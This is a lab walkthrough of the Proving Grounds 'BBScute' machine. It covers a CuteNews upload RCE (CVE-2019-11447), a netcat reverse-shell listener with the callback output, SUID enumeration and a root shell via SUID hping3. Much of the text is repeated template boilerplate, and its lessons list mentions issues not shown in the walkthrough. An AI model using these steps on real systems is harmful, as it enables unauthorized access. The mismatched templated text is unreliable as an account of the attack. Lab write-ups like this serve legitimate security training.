---
title: "Proving Grounds - BBScute (Linux)"
date: 2026-02-25
description: "Proving Grounds BBScute Linux walkthrough covering reconnaissance, initial access, and privilege escalation."
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web RCE (CVE-2019-11447) |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
Powered by [CuteNews 2.1.2](http://cutephp.com/cutenews/) © 2002–2025 [CutePHP](http://cutephp.com/).  
(unregistered)
```

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211033657.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211033801.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211033815.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211033859.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211034015.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211034111.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211034235.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211034253.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the bbscute engagement](/assets/img/pg/bbscute/Pasted%20image%2020251211034353.png)
*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
http://192.168.155.128/uploads/avatar_test_rev.php
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[3:02][CPU:47][MEM:69][TUN0:192.168.45.168][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.168] from (UNKNOWN) [192.168.155.128] 57268
Linux cute.calipendula 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 19:30:50 up  5:43,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat user.txt
```

```bash
www-data@cute:/home/fox$ cat user.txt
Your flag is in another file...
```

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
sudo -l
sudo hping3
```

```bash
www-data@cute:/home/fox$ sudo -l
Matching Defaults entries for www-data on cute:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cute:
    (root) NOPASSWD: /usr/sbin/hping3 --icmp
www-data@cute:/home/fox$ sudo hping3

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

```bash
www-data@cute:/home/fox$ find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwxr-sr-x 1 root mail 18944 Dec  3  2017 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
-rwsr-xr-x 1 root root 23288 Jan 15  2019 /usr/bin/pkexec
-rwxr-sr-x 1 root crontab 43568 Oct 11  2019 /usr/bin/crontab
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 321672 Jan 31  2020 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
-rwsr-sr-x 1 root root 156808 Sep  6  2014 /usr/sbin/hping3
-r-xr-sr-x 1 root postdrop 18552 Jun 30  2020 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 22600 Jun 30  2020 /usr/sbin/postqueue
-rwsr-xr-x 1 root root 18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwxr-sr-x 1 root utmp 10232 Feb 18  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter

```

https://gtfobins.github.io/gtfobins/hping3/#suid
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cd /usr/sbin/
./hping3
```

```bash
www-data@cute:/home/fox$ cd /usr/sbin/
www-data@cute:/usr/sbin$ ./hping3
hping3> /bin/sh -p

```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

## References

- CVE-2019-11447: https://nvd.nist.gov/vuln/detail/CVE-2019-11447
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
